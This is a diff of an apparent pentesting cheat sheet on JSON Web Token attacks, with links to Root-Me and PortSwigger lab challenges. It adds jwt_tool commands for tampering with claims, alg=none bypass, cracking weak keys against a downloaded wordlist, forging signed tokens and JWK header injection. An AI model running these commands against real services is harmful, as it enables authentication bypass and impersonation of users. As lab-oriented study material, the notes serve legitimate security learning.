@@ -60,6 +60,10 @@ You can also use [jwt.io](https://jwt.io/).
 #### JWT wordlists
 
 A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets).
+
+```ps
+$ wget "https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list"
+```
 </div></div>
 
 <hr class="sep-both">
@@ -70,13 +74,20 @@ A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets)
 
 #### JWT — Unverified Signature
 
+[![jwt_unverified_signature](../../../../_badges/ps-lab/jwt/jwt_unverified_signature.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
+
 It's possible for the signature to not be checked at all by the server.
+
+```ps
+$ jwt_tool 'jwt' -I -pc claim -pv value
+```
 
 <br>
 
 #### JWT — Null Signature
 
 [![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)
+[![jwt_flawed_signature_verification](../../../../_badges/ps-lab/jwt/jwt_flawed_signature_verification.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
 
 If the signature algorithm is not verified, you may set it to 'none,' and remove the signature that is not required anymore.
 
@@ -84,17 +95,21 @@ If the signature algorithm is not verified, you may set it to 'none,' and remove
 $ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
 ```
 
+📚 You can use `none`, `None`, `NONE`, etc.
+
 <br>
 
 #### JWT — Weak Secret Key
 
 [![jwt_weak_secret](../../../../_badges/rootme/web_server/jwt_weak_secret.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
+[![jwt_weak_key](../../../../_badges/ps-lab/jwt/jwt_weak_key.svg)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
 
 The secret key may be weak and brute forced:
 
 ```ps
-$ jwt_tool 'jwt' -T -p "key" # use secret key
 $ jwt_tool 'jwt' -C -d ./jwt.secrets.list # crack key
+$ jwt_tool 'jwt' -T -p "key" # use secret key
+$ jwt_tool 'jwt' -p "key" -S hs256 -I -pc claim -pv value
 ```
 
 ```ps
@@ -110,8 +125,9 @@ $ hashcat -m 16500 hash ./jwt.secrets.list
 An application may use the `jwk` header to represent the RSA key used to sign the data. We may be able to inject our own RSA key.
 
 ```ps
-$ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
-$ jwt_tool 'jwt' -T -X i -hc kid -hv jwt_tool     # with kid
+$ jwt_tool 'jwt' -X i -T   # attack 'jwk header injection'
+$ jwt_tool 'jwt' -X i -T -hc kid -hv jwt_tool  # with kid
+$ jwt_tool 'jwt' -X i -I -hc kid -hv jwt_tool -pc claim -pv value
 ```
 </div><div>
 
